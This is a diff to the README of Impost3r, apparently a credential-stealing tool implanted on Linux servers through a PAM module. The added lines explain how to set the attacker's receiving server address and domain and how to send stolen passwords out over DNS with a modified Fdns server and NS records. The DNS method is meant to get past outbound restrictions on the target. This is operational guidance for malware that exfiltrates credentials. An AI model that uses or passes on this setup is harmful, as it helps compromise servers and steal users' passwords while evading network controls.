@@ -62,6 +62,8 @@ fi
 /*
     Send to server
 */
+# define YOUR_DOMAIN ".com" \\Note that if you don’t want to buy a domain name to receive messages sent back by Impost3r and the target server implanted in Impost3r does not prohibit direct udp connections to port 53 of the dns server you control, then please use the default value for the domain name here
+\\But if the target server implanted in Impost3r strictly restricts the outbound dns request, please change the value of YOUR_DOMAIN to the domain name you purchased, such as ".example.com", and meanwhile configure the NS record of this domain name to be the DNS server address you control, run Fdns on this DNS server.Change the value of REMOTE_ADDRESS below to the default dns address of the target server implanted in Impost3r(like 192.168.0.1), also change REMOTE_PORT to the default dns service's listening port(port 53 in most cases).
 # define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server
 # define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.
 # define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
@@ -110,6 +112,8 @@ The following uses Ubuntu as an example, Centos is similar,but the file location
 /*
     Send to server
 */
+# define YOUR_DOMAIN ".com" \\Note that if you don’t want to buy a domain name to receive messages sent back by Impost3r and the target server implanted in Impost3r does not prohibit direct udp connections to port 53 of the dns server you control, then please use the default value for the domain name here
+\\But if the target server implanted in Impost3r strictly restricts the outbound dns request, please change the value of YOUR_DOMAIN to the domain name you purchased, such as ".example.com", and meanwhile configure the NS record of this domain name to be the DNS server address you control, run Fdns on this DNS server.Change the value of REMOTE_ADDRESS below to the default dns address of the target server implanted in Impost3r(like 192.168.0.1), also change REMOTE_PORT to the default dns service's listening port(port 53 in most cases).
 # define MAX_RESEND 30 \\Set the maximum times that Impost3r will try to resends stealing result to attacker's server(This option is valid only when SSH_OR_BOTH is 0)
 # define RESEND_INTERVAL 5 \\Set the interval of resending stealing result.(This option is valid only when SSH_OR_BOTH is 0)
 # define REMOTE_ADDRESS "192.168.0.12" \\Set the malicious server ip address that you want to receive stealing result
@@ -158,6 +162,7 @@ account optional impost3r.so
 ## Attention
 
 - The Dns server progran I use is [Fdns](https://github.com/deepdarkness/Fdns),and I change some params,you can find the changed source code under the ```Fdns``` folder,and use ```gcc -o dns main.c util.c``` to compile it by yourself(Remember changing the monitoring port in source code first).
+- Before compiling Fdns, please check the YOUR_DOMAIN value in util.h to ensure that this value is consistent with the YOUR_DOMAIN value used when compiling the Impost3r program implanted on the server, otherwise it may cause the failure of the stealing.
 - This porject is coding just for fun , the logic structure and code structure are not strict enough, please don't be so serious about it,and also welcome suggestions and prs.
 
 ## Thanks
